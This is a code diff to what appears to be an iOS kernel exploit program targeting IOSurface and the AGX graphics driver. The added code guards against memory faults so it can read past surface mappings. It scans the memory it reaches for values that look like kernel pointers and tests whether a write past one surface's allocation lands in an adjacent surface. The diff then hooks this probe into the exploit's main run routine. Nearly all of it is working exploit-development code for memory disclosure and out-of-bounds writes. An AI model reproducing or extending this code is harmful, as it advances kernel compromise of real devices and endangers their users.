@@ -42,6 +42,8 @@
 #import <sys/utsname.h>
 #import <pthread.h>
 #import <string.h>
+#import <signal.h>
+#import <setjmp.h>
 
 extern kern_return_t mach_vm_read_overwrite(vm_map_t target_task,
     mach_vm_address_t address, mach_vm_size_t size,
@@ -141,6 +143,148 @@ static uint64_t wrap_hdr(uint32_t slices, uint64_t data, uint64_t plane) {
     uint64_t target = per + mod;
     if (target < data) return 0;
     return target - data;
+}
+
+
+// ---- fault-guarded memory probe ----
+// The userspace mapping of an IOSurface can extend past the declared plane.
+// Walk a pointer range without killing the process: a SIGSEGV/SIGBUS inside
+// probe_read1 longjmps back and the walk stops at the last readable page.
+
+static sigjmp_buf g_probe_jb;
+static volatile sig_atomic_t g_probe_live = 0;
+
+static void probe_fault(int sig, siginfo_t *si, void *ctx) {
+    (void)si; (void)ctx;
+    if (g_probe_live) {
+        g_probe_live = 0;
+        siglongjmp(g_probe_jb, 1);
+    }
+    signal(SIGSEGV, SIG_DFL);
+    signal(SIGBUS, SIG_DFL);
+    raise(sig);
+}
+
+static int probe_install(void) {
+    struct sigaction sa;
+    memset(&sa, 0, sizeof(sa));
+    sa.sa_sigaction = probe_fault;
+    sa.sa_flags = SA_SIGINFO | SA_NODEFER;
+    sigemptyset(&sa.sa_mask);
+    if (sigaction(SIGSEGV, &sa, NULL) != 0) return -1;
+    if (sigaction(SIGBUS, &sa, NULL) != 0) return -1;
+    return 0;
+}
+
+static int probe_read1(const uint8_t *p, uint8_t *out) {
+    if (sigsetjmp(g_probe_jb, 1) != 0) return 0;
+    g_probe_live = 1;
+    uint8_t v = *(const volatile uint8_t *)p;
+    g_probe_live = 0;
+    if (out) *out = v;
+    return 1;
+}
+
+static int probe_range(const uint8_t *base, uint64_t off, uint64_t len) {
+    for (uint64_t k = 0; k < len; k++) {
+        if (!probe_read1(base + off + k, NULL)) return 0;
+    }
+    return 1;
+}
+
+// Page-walk forward until the mapping ends, capped at limit.
+static uint64_t probe_extent(const uint8_t *base, uint64_t limit) {
+    uint64_t last = 0;
+    for (uint64_t off = 0x1000ULL; off <= limit; off += 0x1000ULL) {
+        if (!probe_read1(base + off, NULL)) break;
+        last = off;
+    }
+    return last;
+}
+
+static void mem_probe_surface(IOSurfaceRef srf, const char *tag, uint64_t limit) {
+    if (!srf) { L(@"[MX] %s null surface", tag); return; }
+    IOSurfaceLock(srf, kIOSurfaceLockReadOnly, NULL);
+    uint8_t *base = (uint8_t *)IOSurfaceGetBaseAddress(srf);
+    size_t alloc = IOSurfaceGetAllocSize(srf);
+    uint64_t planeEnd = (uint64_t)IOSurfaceGetBytesPerRow(srf) * IOSurfaceGetHeight(srf);
+    L(@"[MX] %s base=%p alloc=0x%zx planeEnd=0x%llx", tag, base, alloc,
+      (unsigned long long)planeEnd);
+    if (!base) { IOSurfaceUnlock(srf, kIOSurfaceLockReadOnly, NULL); return; }
+
+    uint64_t last = probe_extent(base, limit);
+    L(@"[MX] %s lastReadable=0x%llx extraPastAlloc=0x%llx", tag,
+      (unsigned long long)last,
+      (unsigned long long)(last > alloc ? last - alloc : 0));
+
+    for (uint64_t off = alloc; off < alloc + 0x80; off += 0x10) {
+        if (!probe_range(base, off, 16)) break;
+        L(@"[MX] %s +0x%llx: %016llx %016llx", tag, (unsigned long long)off,
+          (unsigned long long)rd64(base + off),
+          (unsigned long long)rd64(base + off + 8));
+    }
+
+    uint64_t hits = 0;
+    for (uint64_t off = planeEnd; off + 8 <= last; off += 8) {
+        if (!probe_range(base, off, 8)) break;
+        uint64_t w = rd64(base + off);
+        if ((w >> 40) == 0xffffffULL && w != 0xffffffffffffffffULL) {
+            if (hits < 12) {
+                L(@"[MX] %s KP +0x%llx = 0x%016llx", tag,
+                  (unsigned long long)off, (unsigned long long)w);
+            }
+            hits++;
+        }
+    }
+    L(@"[MX] %s kernelPointerCandidates=%llu", tag, (unsigned long long)hits);
+    IOSurfaceUnlock(srf, kIOSurfaceLockReadOnly, NULL);
+}
+
+static void mapping_probe(IOSurfaceRef f1surf) {
+    L(@"[MX] === mapping extent probe ===");
+    if (probe_install() != 0) { L(@"[MX] sigaction failed"); return; }
+
+    IOSurfaceRef arr[12];
+    int n = 0;
+    for (; n < 12; n++) {
+        NSDictionary *d = @{
+            (id)kIOSurfaceWidth: @64,
+            (id)kIOSurfaceHeight: @64,
+            (id)kIOSurfaceBytesPerElement: @4,
+            (id)kIOSurfacePixelFormat: @0x42475241
+        };
+        IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)d);
+        if (!s) break;
+        arr[n] = s;
+        uint8_t *b = (uint8_t *)IOSurfaceGetBaseAddress(s);
+        uint8_t *prev = n > 0 ? (uint8_t *)IOSurfaceGetBaseAddress(arr[n - 1]) : NULL;
+        L(@"[ADJ] idx=%d base=%p alloc=0x%zx delta=0x%llx", n, b,
+          IOSurfaceGetAllocSize(s),
+          (unsigned long long)(prev && b && b >= prev ? (uint64_t)(b - prev) : 0));
+    }
+    L(@"[ADJ] created=%d", n);
+
+    if (n >= 2) {
+        IOSurfaceRef pa = arr[n - 2];
+        mem_probe_surface(pa, "PLAIN", 0x40000ULL);
+        size_t aalloc = IOSurfaceGetAllocSize(pa);
+        uint8_t *ab = (uint8_t *)IOSurfaceGetBaseAddress(pa);
+        if (ab && probe_range(ab, aalloc, 4)) {
+            uint32_t mk = 0xfeedface;
+            memcpy(ab + aalloc, &mk, 4);
+            uint8_t *nb = (uint8_t *)IOSurfaceGetBaseAddress(arr[n - 1]);
+            uint32_t back = 0;
+            if (nb) memcpy(&back, nb, 4);
+            L(@"[ADJ] write past prev alloc landed; next[0]=0x%08x", back);
+        } else {
+            L(@"[ADJ] no mapping right past prev alloc");
+        }
+    }
+
+    mem_probe_surface(f1surf, "F1", 0x800000ULL);
+
+    for (int i = 0; i < n; i++) CFRelease(arr[i]);
+    L(@"[MX] === probe done ===");
 }
 
 // Same XML as f1_xml2 with plane and alloc sizes overridden.
@@ -585,6 +729,8 @@ static void run(void) {
     uint64_t agx_va = agx_map(sid, &agx_span, &agx_conn);
 
     metal_cross_object_write(surf, agx_va, agx_span);
+
+    mapping_probe(surf);
 
     if (agx_conn) IOServiceClose(agx_conn);
     for (int i = 0; i < ivc; i++) CFRelease(ios_victims[i]);
